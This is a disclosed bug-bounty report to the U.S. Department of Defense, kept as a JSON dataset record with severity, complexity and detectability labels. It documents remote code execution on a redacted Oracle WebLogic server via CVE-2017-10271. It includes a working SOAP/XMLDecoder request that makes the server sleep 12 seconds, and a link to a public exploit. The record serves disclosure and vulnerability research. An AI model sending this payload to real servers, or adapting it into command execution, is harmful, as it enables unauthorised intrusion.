{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "erbbysam ",
  "title": "RCE on \u2588\u2588\u2588\u2588\u2588 via CVE-2017-10271",
  "content": "\nSummary:\nHappy Friday! The server at \u2588\u2588\u2588\u2588\u2588\u2588 is vulnerable to CVE-2017-10271 \"Oracle WebLogic Server Remote Command Execution\".\nDescription:\nThe following request takes 12 seconds (12000 milliseconds) to complete:\nCode 574 Bytes\n1POST /wls-wsat/RegistrationPortTypeRPC HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3Content-Length: 423\n4content-type: text/xml\n5Accept-Encoding: gzip, deflate, compress\n6Accept: */*\n7\n8<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n9  <soapenv:Header>\n10    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n11      <java class=\"java.beans.XMLDecoder\">\n12        <object class=\"java.lang.Thread\" method=\"sleep\">\n13          <long>12000</long>\n14        </object>\n15      </java>\n16    </work:WorkContext>\n17  </soapenv:Header>\n18  <soapenv:Body/>\n19</soapenv:Envelope>\nThis proves that I have Java code execution on the remote server.\nref: https://techblog.mediaservice.net/2018/07/cve-2017-10271-oracle-weblogic-server-remote-command-execution-sleep-detection-payload/\nPublic exploits for this exist: https://github.com/c0mmand3rOpSec/CVE-2017-10271\nI was not able to use that script with a ping command, which might have been blocked by preventing outbound connections.\nSuggested Mitigation/Remediation Actions\nPatch & possibly don't allow external access.\nImpact\nCritical, RCE.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1562025240,
  "report_url": "https://hackerone.com/reports/576887",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Send a crafted SOAP request to the vulnerable WebLogic server endpoint at /wls-wsat/RegistrationPortTypeRPC with a sleep payload."
    ],
    [
      2,
      "Observe the delayed response (12 seconds in this case) to confirm Java code execution."
    ]
  ],
  "vuln_description": "The vulnerability is a Remote Code Execution (RCE) in Oracle WebLogic Server via CVE-2017-10271. It allows an attacker to execute arbitrary Java code by sending a crafted SOAP request to a vulnerable endpoint. The proof of concept demonstrates this by causing the server to sleep for 12 seconds.",
  "reason": "The attack involves a single, well-documented vulnerability (CVE-2017-10271) with publicly available exploits. The steps to reproduce are straightforward and do not require complex interactions or state manipulation. The vulnerability is well-known and the exploit is not novel.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves executing Java code on a remote server via a specific Oracle WebLogic Server RCE (CVE-2017-10271). The detection methodology described focuses on authentication and authorization bugs within the same application context, such as IDOR and AuthN/AuthZ bypasses. The RCE vulnerability, however, is a server-side issue that does not involve user sessions or resource IDs within the application's authorization framework. It is detected by sending a crafted SOAP request to a specific endpoint, which is outside the scope of the described methodology.",
    "is_detectable": false
  }
}